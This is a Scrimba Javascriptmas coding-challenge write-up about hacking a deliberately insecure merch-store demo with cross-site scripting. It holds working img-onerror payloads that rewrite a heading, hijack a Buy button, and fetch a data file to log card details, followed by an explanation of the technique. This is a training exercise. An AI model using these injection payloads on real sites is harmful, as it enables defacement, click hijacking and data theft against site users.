# Day 12 - Hack Santa's Merch Store 🎅

## Challenge

Santa wants to monetize Christmas so he has set up a merch store. To save money, he got a junior dev from the cheapest dev shop in the backstreets of Lapland to write the code.

The site is taking shape, but now Santa is concerned that it might not be secure, so it's time for you to put on your ethical hacker hat and see if you can do the following:

⚠️ **IMPORTANT 1:** When tackling tasks 1, 2 and stretch goals, you are not allowed to edit index.html, index.js, data.js, or index.css in any way! For task 3 you may edit these files.

⚠️ **IMPORTANT 2:** Any code you use to complete tasks 1 or 2 must be pasted into mySolution.js 👈. If you fail to do this your entry will not count!

***Task 1***
+ Render a button that, when pressed, logs 'You have been hacked 🏴‍☠️' to the console just to prove there are vulnerabilities.

***Task 2***
+ Change the product title h2 to "Do not buy this".

***Task 3***
+ Fix the code so it's unhackable! 

🔥***Stretch Goals*** 👇 - these are only for really dedicated (ethical 😇) hackers to do BEFORE task 3 above.

***Task 4***
+ Hijack the Buy button so when it is clicked it calls a new function. The new function should log 'diverting payment to my account 💰'

***Task 5***
+ Log out the credit card details.

## Solution

| [Scrim code](https://scrimba.com/exercise-s04gtmm45p) |
| --- |

![](../assets/gifs/day-12.gif)

```html
/*
Copy and paste each line below into the textarea as the answer for each task.
*/

// Task #1

<button onclick="console.log('You have been hacked 🏴‍☠️')" style="background-color:slateblue;">Click me! 😃</button>

// Task #2

<img src="" onerror="document.querySelector('h2').textContent = 'Do not buy this'">

// Task #4

<img src="" onerror="document.getElementById('prod-buy').addEventListener('click', () => console.log('Diverting payment to my account 💰'))"> 


// Task #5

<img src="" onerror="fetch('./data.js').then(res => res.text()).then(data => console.log(data))">
```

### *XSS - Cross-Site Scription*
XSS (Cross-Site Scripting) is a type of attack where someone inserts malicious code (usually JavaScript) into a web page that other people visit.

```js
<img src="" onerror="document.querySelector('h2').textContent = 'Do not buy this'">
```

#### *Explanation*:

1. `<img src=""`:
    + It tries to load an image with an invalid source (`src=""`), which triggers an error.

1. `onerror`:
    + The `onerror` attribute executes JavaScript when the image fails to load.

1. **JavaScript Code**:
    ```js
    document.querySelector('h2').textContent = 'Do not buy this';
    ```
    + Selects the first `<h2>` element on the page.
    + Changes its text to **"Do not buy this"**.

#### *Result*:
The text of the first `<h2>` on the page is dynamically replaced with "Do not buy this" when the browser executes the code.

---
[🔙 Javascriptmas 2024](../README.md)